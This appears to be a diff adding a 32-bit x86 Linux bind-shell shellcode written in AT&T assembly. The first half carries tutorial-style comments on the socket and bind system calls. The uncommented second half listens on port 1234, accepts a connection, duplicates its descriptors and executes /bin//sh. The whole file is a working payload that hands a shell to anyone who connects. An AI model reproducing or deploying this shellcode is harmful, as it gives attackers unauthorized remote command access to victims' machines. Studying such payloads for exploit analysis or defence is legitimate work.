@@ -1,0 +1,70 @@
+xorl %ebx,%ebx	# %ebx = 0
+mull %ebx	# multiply the content of %eax with 0, so now the register EDX:EAX is zero
+pushl %ebx	# push %ebx = 0 on the stack, the stack now contains 4 zero bytes
+incl %ebx	# increment %ebx, now %ebx contains the value 1 
+pushl %ebx	# push %ebx on the stack, the stack now contains 4 bytes with the value 1
+pushl $0x2	# push the number 2 on the stack, the stack is now (from top to bottom): 0 1 2
+movl %esp,%ecx	# move the value of the stackpointer in the register %ecx
+movb $0x66,%al	# move the value of 6+6*16=102 to the last quarter of the eax register
+int $0x80	# system call to the function sys_socketcall, the parameters are ebx: 1 ecx: value of the stack pointer
+		# this calls the socket function with the parameters where the stack pointer is
+		# So we call socket(2,1,0), this is socket(AF_INET,SOCK_STREAM,0), the last parameter is always 0
+popl %ebx	# Pop the top of the stack into %ebx, so now we have %ebx = 2
+popl %esi	# Pop the top of the stack into %esi, so now we have %esi = 1
+pushl %edx	# Push %edx = 0 on the stack
+pushl $0xd20402ff	#Push the number 0xd20402ff on the stack, this is 3523478271 in base 10
+pushl $0x10	# Push the number 0x10 on the stack, this is 16 in base 10
+pushl %ecx	# ecx contains a pointer to the 2nd position on the stack, counting from 0, this adress is pushed on the stack
+pushl %eax	# eax contains the return value of the syscall to socket, this is a socket file descriptor and is now pushed to the stack
+movl %esp,%ecx	# moves the adress to the stack pointer to ecx
+pushl $0x66	# pushed the value 0x66 on the stack, this is 6*16+6 = 102 in decimal
+popl %eax	# move the top value from the stack, now 102, to %eax
+int $0x80	# syscall to the function sys_socketcall(2,top of the stack)
+		# The stack now contains (from top to bottom): socketfd pointer8bytesup 16 0xd20402ff 0 0 
+		# this in turn calls the bind function int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+movl %eax,0x4(%ecx)	
+ 
+movb $0x4,%bl	
+ 
+movb $0x66,%al	
+ 
+int $0x80	
+ 
+incl %ebx	
+ 
+movb $0x66,%al	
+ 
+int $0x80	
+ 
+xchgl %eax,%ebx	
+ 
+popl %ecx	
+ 
+	
+loc_00000032:	
+pushl $0x3f	
+ 
+popl %eax	
+ 
+int $0x80	
+ 
+decl %ecx	
+ 
+jns loc_00000032	
+ 
+pushl $0x68732f2f	
+ 
+pushl $0x6e69622f	
+ 
+movl %esp,%ebx	
+ 
+pushl %eax	
+ 
+pushl %ebx	
+ 
+movl %esp,%ecx	
+ 
+movb $0xb,%al	
+ 
+int $0x80	
+ 
